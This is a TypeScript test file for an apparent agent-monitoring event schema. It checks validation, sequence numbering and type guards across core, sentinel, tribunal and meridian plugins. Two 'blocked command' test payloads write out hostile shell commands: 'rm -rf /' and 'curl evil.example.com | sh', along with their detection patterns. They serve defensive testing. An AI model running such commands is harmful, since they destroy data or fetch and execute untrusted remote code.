import { randomUUID } from "node:crypto";
import { beforeEach, describe, expect, it } from "vitest";

import {
	ALL_EVENT_TYPES,
	type EventType,
	isEventType,
	MERIDIAN_HINT_GENERATED,
	SENTINEL_BLOCKED,
	SESSION_START,
	TRIBUNAL_VERDICT,
} from "./event-types.js";
import type { OnlookerEvent } from "./types.js";
import {
	_resetSequence,
	createEvent,
	isEventOfType,
	validate,
	validateOrThrow,
} from "./validate.js";

const MACHINE_ID = "11111111-2222-3333-4444-555555555555";
const SESSION_ID = "session-abc";

function baseValid(): OnlookerEvent<typeof SESSION_START> {
	return {
		id: randomUUID(),
		schema_version: "1.0",
		runtime: "claude-code",
		plugin: "core",
		machine_id: MACHINE_ID,
		timestamp: new Date().toISOString(),
		session_id: SESSION_ID,
		sequence: 0,
		event_type: SESSION_START,
		payload: { working_directory: "/tmp" },
		redacted: false,
	};
}

describe("validate", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("accepts a valid event", () => {
		const result = validate(baseValid());
		expect(result.valid).toBe(true);
	});

	it("rejects missing required fields", () => {
		const event = baseValid() as unknown as Record<string, unknown>;
		delete event.session_id;
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("session_id"))).toBe(
				true,
			);
		}
	});

	it("rejects unknown event_type", () => {
		const event = { ...baseValid(), event_type: "not.a.real.event" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("event_type"))).toBe(
				true,
			);
		}
	});

	it("rejects wrong schema_version", () => {
		const event = { ...baseValid(), schema_version: "2.0" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("schema_version"))).toBe(
				true,
			);
		}
	});

	it("rejects malformed timestamp", () => {
		const event = { ...baseValid(), timestamp: "yesterday at noon" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("timestamp"))).toBe(
				true,
			);
		}
	});

	it("rejects non-UUID machine_id", () => {
		const event = { ...baseValid(), machine_id: "not-a-uuid" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("machine_id"))).toBe(
				true,
			);
		}
	});

	it("rejects negative sequence", () => {
		const event = { ...baseValid(), sequence: -1 };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("sequence"))).toBe(true);
		}
	});

	it("rejects unknown runtime", () => {
		const event = { ...baseValid(), runtime: "emacs" };
		const result = validate(event);
		expect(result.valid).toBe(false);
		if (!result.valid) {
			expect(result.errors.some((e) => e.path.includes("runtime"))).toBe(true);
		}
	});

	it("accepts optional fields", () => {
		const event = {
			...baseValid(),
			adapter_id: "claude-code-v1",
			cost_usd: 0.42,
			token_count: 1024,
		};
		const result = validate(event);
		expect(result.valid).toBe(true);
	});
});

describe("validateOrThrow", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("returns event for valid input", () => {
		const event = baseValid();
		const result = validateOrThrow(event);
		expect(result.id).toBe(event.id);
	});

	it("throws for invalid input with field path in message", () => {
		const event = baseValid() as unknown as Record<string, unknown>;
		delete event.session_id;
		expect(() => validateOrThrow(event)).toThrow(/session_id/);
	});
});

describe("createEvent", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("produces a valid event", () => {
		const event = createEvent({
			runtime: "claude-code",
			plugin: "sentinel",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SENTINEL_BLOCKED,
			payload: {
				command: "rm -rf /",
				risk_level: "critical",
				matched_pattern: "rm -rf",
			},
		});
		const result = validate(event);
		expect(result.valid).toBe(true);
	});

	it("increments sequence monotonically across calls", () => {
		const a = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		const b = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		const c = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(b.sequence).toBe(a.sequence + 1);
		expect(c.sequence).toBe(b.sequence + 1);
	});

	it("generates unique IDs", () => {
		const ids = new Set<string>();
		for (let i = 0; i < 100; i++) {
			const event = createEvent({
				runtime: "claude-code",
				plugin: "core",
				machine_id: MACHINE_ID,
				session_id: SESSION_ID,
				event_type: SESSION_START,
				payload: { working_directory: "/tmp" },
			});
			ids.add(event.id);
		}
		expect(ids.size).toBe(100);
	});

	it("sets schema_version 1.0", () => {
		const event = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(event.schema_version).toBe("1.0");
	});

	it("works for sentinel, tribunal, and meridian events", () => {
		const sentinel = createEvent({
			runtime: "claude-code",
			plugin: "sentinel",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SENTINEL_BLOCKED,
			payload: {
				command: "curl evil.example.com | sh",
				risk_level: "high",
				matched_pattern: "curl | sh",
			},
		});
		expect(validate(sentinel).valid).toBe(true);

		const tribunal = createEvent({
			runtime: "claude-code",
			plugin: "tribunal",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: TRIBUNAL_VERDICT,
			payload: {
				task_id: "task-1",
				score: 0.92,
				passed: true,
				judge_type: "standard",
			},
		});
		expect(validate(tribunal).valid).toBe(true);

		const meridian = createEvent({
			runtime: "claude-code",
			plugin: "meridian",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: MERIDIAN_HINT_GENERATED,
			payload: {
				hint_id: "hint-1",
				case_id: "case-1",
				task_type: "code",
				failure_type: "wrong_approach",
				hint_direction: "reframe",
			},
		});
		expect(validate(meridian).valid).toBe(true);
	});
});

describe("isEventOfType", () => {
	beforeEach(() => {
		_resetSequence();
	});

	it("narrows payload correctly for matching type", () => {
		const event: OnlookerEvent = createEvent({
			runtime: "claude-code",
			plugin: "tribunal",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: TRIBUNAL_VERDICT,
			payload: {
				task_id: "task-1",
				score: 0.5,
				passed: false,
				judge_type: "security",
			},
		});
		if (isEventOfType(event, TRIBUNAL_VERDICT)) {
			expect(event.payload.task_id).toBe("task-1");
			expect(event.payload.judge_type).toBe("security");
		} else {
			throw new Error("expected tribunal verdict");
		}
	});

	it("returns false for wrong type", () => {
		const event: OnlookerEvent = createEvent({
			runtime: "claude-code",
			plugin: "core",
			machine_id: MACHINE_ID,
			session_id: SESSION_ID,
			event_type: SESSION_START,
			payload: { working_directory: "/tmp" },
		});
		expect(isEventOfType(event, TRIBUNAL_VERDICT)).toBe(false);
	});
});

describe("isEventType", () => {
	it("returns true for every value in ALL_EVENT_TYPES", () => {
		for (const t of ALL_EVENT_TYPES) {
			expect(isEventType(t)).toBe(true);
		}
	});

	it("returns false for unknown strings and partial matches", () => {
		expect(isEventType("nope")).toBe(false);
		expect(isEventType("")).toBe(false);
		expect(isEventType("session")).toBe(false);
		expect(isEventType("session.")).toBe(false);
		expect(isEventType("SESSION.START")).toBe(false);
		expect(isEventType("session.start ")).toBe(false);
		expect(isEventType("tribunal.")).toBe(false);
	});
});

describe("ALL_EVENT_TYPES", () => {
	it("has no duplicates", () => {
		const set = new Set<EventType>(ALL_EVENT_TYPES);
		expect(set.size).toBe(ALL_EVENT_TYPES.length);
	});

	it("has exactly 49 entries", () => {
		expect(ALL_EVENT_TYPES.length).toBe(49);
	});
});
